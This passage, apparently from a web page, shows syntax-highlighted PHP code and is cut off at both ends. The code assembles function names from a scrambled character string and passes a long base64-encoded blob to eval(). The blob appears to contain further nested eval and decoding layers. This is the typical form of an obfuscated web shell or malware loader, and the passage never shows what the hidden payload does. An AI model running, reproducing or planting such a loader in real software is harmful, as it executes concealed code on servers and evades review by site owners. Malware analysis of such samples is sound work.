class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">6</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">33</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">30</span>&#125;;</span><br><span class="line"><span class="variable">$hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ</span> = <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">33</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">10</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">24</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">10</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">24</span>&#125;;</span><br><span class="line"><span class="variable">$vNwTOsKPEAlLciJDBhWtRSHXempIrjyQUuGoaknYCdFzqZMxfbgV</span> = <span class="variable">$hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ</span>&#123;<span class="number">0</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">18</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">3</span>&#125; . <span class="variable">$hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ</span>&#123;<span class="number">0</span>&#125; . <span class="variable">$hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ</span>&#123;<span class="number">1</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">24</span>&#125;;</span><br><span class="line"><span class="variable">$ciMfTXpPoJHzZBxLOvngjQCbdIGkYlVNSumFrAUeWasKyEtwhDqR</span> = <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">7</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">13</span>&#125;;</span><br><span class="line"><span class="variable">$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC</span>.= <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">22</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">36</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">29</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">26</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">30</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">32</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">35</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">26</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">30</span>&#125;;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC</span>(<span class="string">&quot;JE52aXV5d0NlUFdFR2xhY0FtZmpyZ0JNVFlYekhacEl4RHFRbnNVS2tob3RGU09SZFZKTGI9IldBckllVEJFWFBaTlN0b3ppZ2hmcENPUlV2S0x5eFFubXdsR2NqYVZiRGtGdUpZZHNNSHF1d1dBZW1NVWhRb0NMYURma0Z4VEtsenRCWHJkT2liSEpqeU52WVNQcGNzSVpFR1JnblZxUWM5alNWd0ZvTlBKU3U1eXJsUjZTMkNzcHV5TlBJb3JMSUk1dnU5RFJVYU9wSHhmbVZSSmIwdGpQQnlvU3lFSXVzRUNQMmlidVU5MlJCNUhCMkV4b0JJVkVPaWpvSmE2dVBQeXBWeEl0MjF1RzJ0VW1zaUJTeXhjQjB5SG1CRWRtM1BBYkJvNUJIdHhHSjlpUjBLS0JQUjJ2MUtPQk54WnJtZ3NieW96R3NDWVNKOWlHdTUxdnlJeVNVeUh0QjlhbVVSU21QUDZlUHQ0QlZDMFMzUk1SSm9qQjBhTHVOaXJTdXRodFVvb0xjMTF2Smlzb3VDWG9OQkRBa0IydG1VeUMwVXlDWUF5bnNHeUNzYnlDWVUxRW1QY0VtdjJFbXYwbmxCMnptQTRFbUVVRW12akVtdjRFbXYxRW12aUVtdjVFbUVNQ2tCMmJPQjNua0IyYmtCMkNsQjJDZnN5Q0JHeUNZQnlDWUZ5Q1lueUNmbnlDZnZ5Q3NHMEVtRWxFbUcybmZ2eUNzVWtybWdzR2h5enZ1NXlwM0VVTFZ4TmJ5QzNHMGFEbU5LckJWdFFTQkNKdUJJSHVIb2twSXhQQnl0aFBKMWp0QjF0dDJhNkx1dGZSbTBzYnlvekdzQ1lTSjlpR3U1MXZ5SXlTVXlIdEI5YW1VUlNtUFA2ZVB0NEJWQzBTM1JNUkpvakIwYUx1TmlyU3V0aHRVb29MVmdmVEw0c2J5b3pHc0NZU0o5aUd1NTF2eUl5U1V5SHRCOWFtVVJTbVBQNmVQdDRCVkMwUzNSTVJKb2pCMGFMdU5pclN1dGh0VW9vTFZnMlRMNHNieW96R3NDWVNKOWlHdTUxdnlJeVNVeUh0QjlhbVVSU21QUDZlUHQ0QlZDMFMzUk1SSm9qQjBhTHVOaXJTdXRodFVvb0xWZ2ZuMzBaRVVFdW1KRWNHMktYdnVJWlJoRXRvdXhFbzBQUXBCaVZ1czFQZUh5QmVJTWZSTmEzYmhvSnZJQ2RCeXhnTEp5c1AwdE51Qng3bmZNOXpPdG90MUtBUkp5amIzUDZtMW9pdnlSQkJCb2dvSHlsTGh0YnYyeGtHM3h5THMxZEdCUEdwMjEzQkpSWlB1YW1vVUlubXN0cVFMdGxQczVrYjJDcXAzSXhwSFBPQnVQREx1UkltMjFudDFLQ1BoSzVQVnhidjN0V1IwSTJvSE1tTDFFR3BVS0tvSVJVdHl5QWVmbmZUTDRzYnlvekdzQ1lTSjlpR3U1MXZ5SXlTVXlIdEI5YW1VUlNtUFA2ZVB0NEJWQzBTM1JNUkpvakIwYUx1TmlyU3V0aHRVb29MVmdpblYwWkVVRXVtSkVjRzJLWHZ1SVpSaEV0b3V4RW8wUFFwQmlWdXMxUGVIeUJlSU1mUk5hM2Job0p2SUNkQnl4Z0xKeXNQMHROdUJ4N25ZdDlka3RsUHM1a2IyQ3FwM0l4cEhQT0J1UERMdVJJbTIxbnQxS0NQaEs1UFZ4YnYzdFdSMEkyb0hNbUwxRUdwVUtLb0lSVXR5eUFlZlVqVEw0c2J5b3pHc0NZU0o5aUd1NTF2eUl5U1V5SHRCOWFtVVJTbVBQNmVQdDRCVkMwUzNSTVJKb2pCMGFMdU5pclN1dGh0VW9vTFZnT0NWMDdFSXRzdlUxclMyeEd0aElTbUpDYkdoeGtlQmFodDNLdVJOUEhCdTVPdUJpUXRKeTFTc3RjcEJ4THBWUk1iSjlQTGhvbXYyRzlFSXlWdXN4MlNoTWNSaEtRUEhJT1AxdHR0SmlKZUJFRVJJTWZTTkVZZU5Qcm1CYXh0UHhYcGhSTG8yNVBTMUNzYkJpenROSzduVjBaRVVFdW1KRWNHMktYdnVJWlJoRXRvdXhFbzBQUXBCaVZ1czFQZUh5QmVJTWZSTmEzYmhvSnZJQ2RCeXhnTEp5c1AwdE51Qng3bm14OWRrdGxQczVrYjJDcXAzSXhwSFBPQnVQREx1UkltMjFudDFLQ1BoSzVQVnhidjN0V1IwSTJvSE1tTDFFR3BVS0tvSVJVdHl5QWVmQzlka3RvdDFLQVJKeWpiM1A2bTFvaXZ5UkJCQm9nb0h5bExodGJ2MnhrRzN4eUxzMWRHQlBHcDIxM0JKUlpQdWFtb1VJbm1zdHFlZk05ZGt0b3QxS0FSSnlqYjNQNm0xb2l2eVJCQkJvZ29IeWxMaHRidjJ4a0czeHlMczFkR0JQR3AyMTNCSlJaUHVhbW9VSW5tc3RxZWZJOWRrdGxQczVrYjJDcXAzSXhwSFBPQnVQREx1UkltMjFudDFLQ1BoSzVQVnhidjN0V1IwSTJvSE1tTDFFR3BVS0tvSVJVdHl5QWVmQTBUbWdzdjNLeUcyMW9SdUlPcFZ4TlBCeWhldTlrUk5vWm1VNXJCUHRjdFZvYlMxb210MHhIdFBLS3VOeFFtQmEzdlVFc2J1S2lCWTBzYnlvekdzQ1lTSjlpR3U1MXZ5SXlTVXlIdEI5YW1VUlNtUFA2ZVB0NEJWQzBTM1JNUkpvakIwYUx1TmlyU3V0aHRVb29MVmczVEw0c2J5b3pHc0NZU0o5aUd1NTF2eUl5U1V5SHRCOWFtVVJTbVBQNmVQdDRCVkMwUzNSTVJKb2pCMGFMdU5pclN1dGh0VW9vTFZnaW4zMDdFTkk1bUhJWm91OU90VXg0dHNFbVIyQ2RTVWlxTHlNMG0yeWNveXlNbzFLMkdKaUdQUEVCUDFvYXZVUENCQlJXZXN5c3YzQlpRTHRsUHM1a2IyQ3FwM0l4cEhQT0J1UERMdVJJbTIxbnQxS0NQaEs1UFZ4YnYzdFdSMEkyb0hNbUwxRUdwVUtLb0lSVXR5eUFlZkFPVEw0c2J5b3pHc0NZU0o5aUd1NTF2eUl5U1V5SHRCOWFtVVJTbVBQNmVQdDRCVkMwUzNSTVJKb2pCMGFMdU5pclN1dGh0VW9vTFZnZkNIMFpFVUV1bUpFY0cyS1h2dUlaUmhFdG91eEVvMFBRcEJpVnVzMVBlSHlCZUlNZlJOYTNiaG9KdklDZEJ5eGdMSnlzUDB0TnVCeDduWXk5ZGt0bFBzNWtiMkNxcDNJeHBIUE9CdVBETHVSSW0yMW50MUtDUGhLNVBWeGJ2M3RXUjBJMm9ITW1MMUVHcFVLS29JUlV0eXlBZWZBMlRMNHNieW96R3NDWVNKOWlHdTUxdnlJeVNVeUh0QjlhbVVSU21QUDZlUHQ0QlZDMFMzUk1SSm9qQjBhTHVOaXJTdXRodFVvb0xWZ2ZuVjBaRVVFdW1KRWNHMktYdnVJWlJoRXRvdXhFbzBQUXBCaVZ1czFQZUh5QmVJTWZSTmEzYmhvSnZJQ2RCeXhnTEp5c1AwdE51Qng3bmZFOWRrdGxQczVrYjJDcXAzSXhwSFBPQnVQREx1UkltMjFudDFLQ1BoSzVQVnhidjN0V1IwSTJvSE1tTDFFR3BVS0tvSVJVdHl5QWVmbjFUTDRzYnlvekdzQ1lTSjlpR3U1MXZ5SXlTVXlIdEI5YW1VUlNtUFA2ZVB0NEJWQzBTM1JNUkpvakIwYUx1TmlyU3V0aHRVb29MVmdPQ0gwWkVVRXVtSkVjRzJLWHZ1SVpSaEV0b3V4RW8wUFFwQmlWdXMxUGVIeUJlSU1mUk5hM2Job0p2SUNkQnl4Z0xKeXNQMHROdUJ4N25mTTl6MlAyR3VqREVOSTVtSElab3U5T3RVeDR0c0VtUjJDZFNVaXFMeU0wbTJ5Y295eU1vMUsyR0ppR1BQRUJQMW9hdlVQQ0JCUldlc3lzdjNCREFzS0l1czl4TElLeEJZTWpweW9ndHlva3VWTTVHMFI0dlBLR3RIRUJudWl6UG1NZ1NQb0FCSG9ZblZ0Q0J1NURCMUdPdHN5eFBCNXFCeVBMblBLTlNVRXNuQkExdUowMHpCeWd2VlB5cHlLNUJzUnVleUNocFU1a1BCb2RQQlB6bklvWmJ5eXNuQjVMQllFTnYxb1BlTjl1bll5V29QUnp0MUV1Qll0U251aml1dWlyYjFDSVJJTXhuY1BpdUo1TmV5eXVMc2F5UEppNFBjTTBTeW9HTEh0dW5VR09Hc1JycHlLV25QSUxTMngyb2NDTHAySWd1SmF4UHlFckcwb0RiMUVoQ1BFaHBITUJQVXh1TE5Vam1zUFNQbUIwQlBvV0NQdGh6bUlrUGZQbFB1S3R6QnlxUk5pc3BCb2ZMMENZZDFNS0czUHJ0MEcxUE41TlJQS2h6aHlMdHVGMEJKYXJQTmJPbXNpeHRoeGlCMmlsbkliT3BVdFNwTmlsdVlJam55eWFlSXl1UHNLUFBZSVNSTkNJUHM1UFB1dE9vdWFnUzJuZlB1OXJ0SmlBUDJhRG5KSUdic3RzdVZNYlBKNU5lUEdpQnlFTHBoeGFvUFByTEp0TmJIS3h0MEtxb0JSdUwxdFBSTnhMUEp4Mkd5eHNCMURPQ1BveG5CNVdCUFA0bTFFVnAyOXJ0eUVXRzBCaUwyVU9TSXlMdVVveFBOMXpCUHlHU055eVBodEdCWUNqUDJ0VlBKNVBQZlA1UDFQNEJJRWFwY0l4UzFFVUd5UERCMkVBb1VFdHBteXVCMXhTUE5uT3V1OXJ0UEtRR0J4U0dQQWp2TjV1cFVvdUd5eGpldUNWZVZJU3VVb09QY0lnbXlCanBOeXVMSUUyR2ZNMG1QSVpTSUN1bnNvRUdQUHpTeUVQQllJU3RKeGxvY0lsQ1BLYUNWQ3JMVTQydXlSelJJUkdQSnhZcGhGMEJKaXVMeUdmcFZvb3B5RWFHSmE0bTFDZ3R5UHRuSUFPUEJSMFAxQmpvVXlTbklveEdQb0RwMWJqbkJpc24wRWN1c1BOdnVDdUxoSUNTdWFmTHNvTFMyQ0luQmF4bkp4b0J5eE5HUHRhbXlJb3VOeEtvUFAwdUlBZnZJUnN0MW9aUFB2MWVQUlBlSU1McHVqaUd1YUx0TkVQU0lDa0xOdGxCdTA1UHlDR3V5dFlueXlYTHNQU20ySUF1SklMblZNWlBKaU5QSkVHdlZ5WXQzeGl1eXhOdnliaXBVNVBuTmlLUHN4TFJKbmpSVTF0cEp4bVBZRU5MdUlQbUpLTFBQQWl1c29EYkpiaWJZUFNwbXRmTHN4ekN5S2htSHRodUlvREcyMTRDSUVnUHNLdW4yaTJ1dTVMcHVFV2VVOW1wVW9QQm1NTG55UFZSSVJQbk50RXVZTXVHdUl1U045Qm5jSW5vY0NsYjFLSXRISVlQc3lmTHN4ekN5S2htSHRodUlvREcyMTRDSUVnUHNLdW4yaTJ1dTVMcHVFV2VVOW1wVW9QQm1NTG55UFZSSVJQbk50RXVZTXVHdUl1U045Qm5jSW5vY0NsYjFLSXRISVlQc3lqbVVDTFBQS0FiczVtcGh0WFAwUHVlSVJXQ3VLUHQwRzB1dTVnbUlHam9jb3VweUVndVlJTlJ1Q2dwVTFCbklLam9JUmp0UFVPbkJ5UHBoRmZCUFByUnlvUHBjRVBuMDVhTDBDTHQxdGFTY0VoUzJ0ZHVZSVNCeW9obm1vWXBzRWZHdTF1ZU5VanpQS0JQczVydXVpTG5OQWZtc2lCdEJEMFB1aXNTSUNWcFV0b25Jb0lvSVJMdVBJR29JSXlQMUsxbVV0TXYwS0FtWW9TUDA1MFAxeHVTTkNhZWN0THBJb3JQWUNnUnl5WkJKMWtTM3hRQjJpTlBQVWpCWUVQdDN0aFBtTXNMUERqUEpJeFBKeFhQY3dpbU5iZmJzQ1N0Qm9pRzFvRXZVYW1TM01RUmYwOUFrc0t6ZjgrUWM5alNWd0ZvTlBKU3U1eXJsUlpTeW81djBFU1JIeE9tTmFOdXV0enAyb1lvMFIxR2hSVUxKRWd2VTltQkJQQUJ5UGFMMnlNU1ZLRWIyUDBCVTFpdUlSQkVPaWpvSmE2dVBQeXBWeEl0MjF1RzJ0VW1zaUJTeXhjQjB5SG1CRWRtM1BBYkJvNUJIdHhHSjlpUjBLS0JQUjJ2MUtPQk54WnJtZ3NtMmladE5hNm1KUGlSSktkcFB5RG1CRUVCM3hyYjNQU295SUxSMGloTFVSTnYzdFBHMElYdUlvNXZKRUt0UHRiR3V0SHZjMTF2Smlzb3VDWG9OQkRBa0IydG1VeUMwVXlDWUF5bnNHeUNzYnlDWVUxRW1QY0VtdjJFbXYwbmxCMnptQTRFbUVVRW12akVtdjRFbXYxRW12aUVtdjVFbUVNQ2tCMmJPQjNua0IyYmtCMkNsQjJDZnN5Q0JHeUNZQnlDWUZ5Q1lueUNmbnlDZnZ5Q3NHMEVtRWxFbUcybmZ2eUNzVWtybWdzTE5FR29WdFZQdWF5dEJ0Z0JKUmpSM0N4dkpvWlB5eVhQSUNkTHVDYlJKeGNQMktsU2hLdG1JSzR0czExZXUxTW1ISXJtZjBzbTJpWnROYTZtSlBpUkpLZHBQeURtQkVFQjN4cmIzUFNveUlMUjBpaExVUk52M3RQRzBJWHVJbzV2SkVLdFB0Ykd1dEh2VmdmVEw0c20yaVp0TmE2bUpQaVJKS2RwUHlEbUJFRUIzeHJiM1BTb3lJTFIwaWhMVVJOdjN0UEcwSVh1SW81dkpFS3RQdGJHdXRIdlZnMlRMNHNtMmladE5hNm1KUGlSSktkcFB5RG1CRUVCM3hyYjNQU295SUxSMGloTFVSTnYzdFBHMElYdUlvNXZKRUt0UHRiR3V0SHZWZ2ZuMzBaRVU5Z3BzdFdlczV5dmhvcUwyMW9TVTFsTFBDNExzQzF1Sm90QkhSblAweFZ0SEMwUHVDTXAxeHVlaEVrU0JQQkJOSXNvM003bmZNOXpPdEVwMkN5YjI1aVBzYVF0SmFPcElFcVBQTUlvVTVEYmhQbW1CS2xlSjFWUnl0bmVodEt2MlJqdXl5a0JQeEFvc3QzUDN4eFFMdFFwTjVVUzNLem9oSTJTc2FhdXV4Q2JzeW1lVUtjUlBLSkJQRTNtSVJBdDBvZlJJUFlidTlHUEh5T0dKeUlQSU14b05SamVmbmZUTDRzbTJpWnROYTZtSlBpUkpLZHBQeURtQkVFQjN4cmIzUFNveUlMUjBpaExVUk52M3RQRzBJWHVJbzV2SkVLdFB0Ykd1dEh2VmdpblYwWkVVOWdwc3RXZXM1eXZob3FMMjFvU1UxbExQQzRMc0MxdUpvdEJIUm5QMHhWdEhDMFB1Q01wMXh1ZWhFa1NCUEJCTklzbzNNN25ZdDlka3RRcE41VVMzS3pvaEkyU3NhYXV1eENic3ltZVVLY1JQS0pCUEUzbUlSQXQwb2ZSSVBZYnU5R1BIeU9HSnlJUElNeG9OUmplZlVqVEw0c20yaVp0TmE2bUpQaVJKS2RwUHlEbUJFRUIzeHJiM1BTb3lJTFIwaWhMVVJOdjN0UEcwSVh1SW81dkpFS3RQdGJHdXRIdlZnT0NWMDdFVXRZR0h5Ym1ITW9CMGExdEJDMm91YUVQeUtnbTFJTlBVMTNvMXhLcHNJSkd1OUFvVktpU1VSaEJIRW52MjFyYkpLUFJWRjlFVXlYRzJQY3BISXVMMDlOUzNFZ0JKS1BCVVBzbUp4TVJQQ0NMc0U2cEJSMlBVaTVSTnlmbzNNU3V1RXR1VXhKdFZSaGVOSTduVjBaRVU5Z3BzdFdlczV5dmhvcUwyMW9TVTFsTFBDNExzQzF1Sm90QkhSblAweFZ0SEMwUHVDTXAxeHVlaEVrU0JQQkJOSXNvM003bm14OWRrdFFwTjVVUzNLem9oSTJTc2FhdXV4Q2JzeW1lVUtjUlBLSkJQRTNtSVJBdDBvZlJJUFlidTlHUEh5T0dKeUlQSU14b05SamVmQzlka3RFcDJDeWIyNWlQc2FRdEphT3BJRXFQUE1Jb1U1RGJoUG1tQktsZUoxVlJ5dG5laHRLdjJSanV5eWtCUHhBb3N0M1AzeHhlZk05ZGt0RXAyQ3liMjVpUHNhUXRKYU9wSUVxUFBNSW9VNURiaFBtbUJLbGVKMVZSeXRuZWh0S3YyUmp1eXlrQlB4QW9zdDNQM3h4ZWZJOWRrdFFwTjVVUzNLem9oSTJTc2FhdXV4Q2JzeW1lVUtjUlBLSkJQRTNtSVJBdDBvZlJJUFlidTlHUEh5T0dKeUlQSU14b05SamVmQTBUbWdzUzJDM0wyRW1vMnhoU2hLb3RoUE10MHRRUFVveExJeHRCSHRabVZ5bHBVS2piMHlhb3VLZnZzNTJ1SEliUFBvNG9zMXNwZjBzbTJpWnROYTZtSlBpUkpLZHBQeURtQkVFQjN4cmIzUFNveUlMUjBpaExVUk52M3RQRzBJWHVJbzV2SkVLdFB0Ykd1dEh2VmczVEw0c20yaVp0TmE2bUpQaVJKS2RwUHlEbUJFRUIzeHJiM1BTb3lJTFIwaWhMVVJOdjN0UEcwSVh1SW81dkpFS3RQdGJHdXRIdlZnaW4zMDdFVXhrdU50MHQxUFdvQlBVcElFSHZWUmZHaEVKcHlvb3AxdG1MMHlZQlZvRGIxUnFiSnk2QkJpU2VVb0NSaHlhYkI1aUxzOFpRTHRRcE41VVMzS3pvaEkyU3NhYXV1eENic3ltZVVLY1JQS0pCUEUzbUlSQXQwb2ZSSVBZYnU5R1BIeU9HSnlJUElNeG9OUmplZkFPVEw0c20yaVp0TmE2bUpQaVJKS2RwUHlEbUJFRUIzeHJiM1BTb3lJTFIwaWhMVVJOdjN0UEcwSVh1SW81dkpFS3RQdGJHdXRIdlZnZkNIMFpFVTlncHN0V2VzNXl2aG9xTDIxb1NVMWxMUEM0THNDMXVKb3RCSFJuUDB4VnRIQzBQdUNNcDF4dWVoRWtTQlBCQk5Jc28zTTduWXk5ZGt0UXBONVVTM0t6b2hJMlNzYWF1dXhDYnN5bWVVS2NSUEtKQlBFM21JUkF0MG9mUklQWWJ1OUdQSHlPR0p5SVBJTXhvTlJqZWZBMlRMNHNtMmladE5hNm1KUGlSSktkcFB5RG1CRUVCM3hyYjNQU295SUxSMGloTFVSTnYzdFBHMElYdUlvNXZKRUt0UHRiR3V0SHZWZ2ZuVjBaRVU5Z3BzdFdlczV5dmhvcUwyMW9TVTFsTFBDNExzQzF1Sm90QkhSblAweFZ0SEMwUHVDTXAxeHVlaEVrU0JQQkJOSXNvM003bmZFOWRrdFFwTjVVUzNLem9oSTJTc2FhdXV4Q2JzeW1lVUtjUlBLSkJQRTNtSVJBdDBvZlJJUFlidTlHUEh5T0dKeUlQSU14b05SamVmbjFUTDRzbTJpWnROYTZtSlBpUkpLZHBQeURtQkVFQjN4cmIzUFNveUlMUjBpaExVUk52M3RQRzBJWHVJbzV2SkVLdFB0Ykd1dEh2VmdPQ0gwWkVVOWdwc3RXZXM1eXZob3FMMjFvU1UxbExQQzRMc0MxdUpvdEJIUm5QMHhWdEhDMFB1Q01wMXh1ZWhFa1NCUEJCTklzbzNNN25mTTl6MlAyR3VqREVVeGt1TnQwdDFQV29CUFVwSUVIdlZSZkdoRUpweW9vcDF0bUwweVlCVm9EYjFScWJKeTZCQmlTZVVvQ1JoeWFiQjVpTHM4REFzS0lTTjFzUHM1WlBJUHJCTlBWU1Zvc3BzRGpHSjBpdUpQYVJJb0xuSUtOUDI1enZJRU5TY1BtUzJpZnV1YTB0SUdPdlZSdVMzeHRQc3hzU0pDaFBKeEJTMG9tdXNvSXpCeWdvY010bjJ4NkcxUHVuUHRJQ1BQUG5OdG1HbUlTcFBSV1JVeXhwSW9TUEJQZ1J5RE9DQkN4UFBLWEcyMXJDUGJpU054b25Vb2dHc3ZpbjJDSXZOYXlweUtMQnNCaXQxeWdMeUtrUzN4Z1BZQ3VMSW9JUlZLQnBWd09QY0NsU3lEalBIeXN0Snhjb0JQekJKRVZ2SVJTUzFBZlBtQWlDdUNQU1ZNeG5CRXpvdTFMTDF5UHBWb3RQMnh1UDBSSEN1UFp0SjV4UHV0bVBJUlNTMkNVTEoxa3Bzb1Z1UHhEU0lvcXBVNVlQUEtTUEJSemVzNVBlY0VQUHNFckJQb2xTMDFhUk41bXBJbzRtQnhsUjJDVlBtSWtuMEV6QllJTm0wMGZ1SjFvUFVFUXVtQ0xteVJHdklQQ1B1dFFQTjVycFBuZnVzUkN1SW80RzJpU0NOVWl2SUl4TFVBMVBOYU5QdVB1dVlNc1Nzb2x1c3ZpQ3MxVm1zRVluMXk1b1VQU0NKUEl2SVJRUEJvUG1QUHNlUEVxbXlJb3BKdDZQQlBnZU5QUG9OYW10VUt0R1lDWWVQeWF0Skt1dGZiNUx1SzBwTnRhdEhDZGIyblhCTnlZUkJLSVNOeWh0MUFqQllJdXZ5S1BQc1BrdHNLWkcweHNleXlHTEoxa3BJS1NHWUlMUEluanBOS1BMSUtYQm1Jc3ZQSWFwY29QUGh4eG9CUFNtSnRHcFZ0dFBtUDRCMmc0cDBLSXBWb29ueW9VR0o1TlAxbmp6QlJ4bjBLZlB1MWpQeVBJUEphQnB1eGxvSW96bXlDV0xZb2tQdWJPUHNQNEN1dFZwVktTbjBFeFAxUnJCeVJJU04xTExOdEdvQlJJcDBLSUJKS29wSml0UE41bHV5QmpSY0lMUEI0T3V5UjBMeW9ndlZDQm5Cb1ZQc0JpbjFEaVNWTWtTMG9hdVB2NUxQS0F2Vnh4dHV0R1B1NXJtdW5PbkJhdHBoTXVvVXhIcDBLSVNOMXNQczVaUElQckJOUFZTVm9zcHNEakdKMGl1SlBhUklvTG5JS05QMjV6dklFTlNjUG1TMmlmdXVhMHRJR092VlJ1UzN4dFBzeHNTSkNoUEp4QlMwb211c29JdjBLVlJOS3NuVnRLUG1Fc3AxR09wY29oUFBHaUJQUHN0UGJpQnNSb1B1eG9QUG9ybk5FV2VjUHRwaHhkRzBQekxKRWhQSElZbjBLUW9OaWplSVBOUHlSeXQxS3p1c3Y0dkIxS1MzQ3J0UEVxdXU1Z0JQdFpieUtQblZiaUJ5UHpueUtoUlVLdXBWTWZQY0lOdDFvSW5tQ1NudXhqR0phTnBQeWh6QnlTTFZNNEdCUHN1SVBaTHMxWW5ZSWRCdTFqUEp0QW8yOXJ0dXhhb0lvenB5dFBMeU15dDJ4Mm9ONXJuTkVhblBLeXBodHVCWU1TdHlSWm1ITUx0SkYxQjJhZ3YxeVdSVXR1bkhNM1BKYTRCUG9Bb05LWVAxb0RQTmFOQjFLTnRoQ3J0M3Rxb2NNMFNQQk9vTjl1bkpqMlAxUHVuUElQb1VQQm5QRVZ1UFBEdVBQdUxZTWtTM0YxQnUxNEwyQ0ltc0trUDFvaUdmQ3JtMnRndlZ4UHR5b2hvQlJTbXlLVnpWQ3J0M3Rxb2NNMFNQQk9vTjl1bkpqMlAxUHVuUElQb1VQQm5QRVZ1UFBEdVBQdUxZTWtTM0YxQnUxNEwyQ0ltc0trUDFvaUdmQ3JtMnRndlZ4UHR5b2hvQlJTbXlLVnpWTW5iMUVJdW1FckNQUElDaFJoUHM1bm9JUHV0TnRhUEhFbVB5S3hHc0I1QnlFZ0JzNXNuSnRvR1B2MWJ5S2F0SG9tdDFBMkcxUkRMSUdpTEh5QkxVNTBCMmFydlBvR0JZdGRiMUVFdUo1dVBJRGpuQkNCbjJ4WEdZQ1NldXRWQ2h0aHVWTU9QeVBzdDFFdXZWS3hQUEVvb1BQakxKRVZMc2l0bnV0aUcwb1NtUFBOQllDb24wb2d1UEIxYnlQYUJ5RW50VUlmTHNSMFNKYmpSTnlQbkp0WFBZRWdDeVJQUFlJdFB1dElQY0lMdDF5UFNJeVBQc0RqR0phNENQSWFlVWFZdEI1ckd5UnV2dW5mTHM5c3BWTTRQQm91UDJQVnVzNVN0ZnhqTDFDV3ZVOTNRbTBrckxzN1FmND0iO2V2YWwoJz8+Jy4kQndsdHFPWWJIYVFrUlBOb3hjZm5GbXpzSWpoZE1EQVdVZUtHZ3ZpVnJKWnBMdVhFVFN5QygkaFlYbFRnQnFXQXBPYnhKdmVqUFJTZEhHUW5hdURpc2ZFTklGeW9jcmtVTHdtS01DdFZ6Wigkdk53VE9zS1BFQWxMY2lKREJoV3RSU0hYZW1wSXJqeVFVdUdvYWtuWUNkRnpxWk14ZmJnVigkTnZpdXl3Q2VQV0VHbGFjQW1manJnQk1UWVh6SFpwSXhEcVFuc1VLa2hvdEZTT1JkVkpMYiwkY2lNZlRYcFBvSkh6WkJ4TE92bmdqUUNiZElHa1lsVk5TdW1GckFVZVdhc0t5RXR3aERxUioyKSwkdk53VE9zS1BFQWxMY2lKREJoV3RSU0hYZW1wSXJqeVFVdUdvYWtuWUNkRnpxWk14ZmJnVigkTnZpdXl3Q2VQV0VHbGFjQW1manJnQk1UWVh6SFpwSXhEcVFuc1VLa2hvdEZTT1JkVkpMYiwkY2lNZlRYcFBvSkh6WkJ4TE92bmdqUUNiZElHa1lsVk5TdW1GckFVZVdhc0t5RXR3aERxUiwkY2lNZlRYcFBvSkh6WkJ4TE92bmdqUUNiZElHa1lsVk5TdW1GckFVZVdhc0t5RXR3aERxUiksJHZOd1RPc0tQRUFsTGNpSkRCaFd0UlNIWGVtcElyanlRVXVHb2FrbllDZEZ6cVpNeGZiZ1YoJE52aXV5d0NlUFdFR2xhY0FtZmpyZ0JNVFlYekhacEl4RHFRbnNVS2tob3RGU09SZFZKTGIs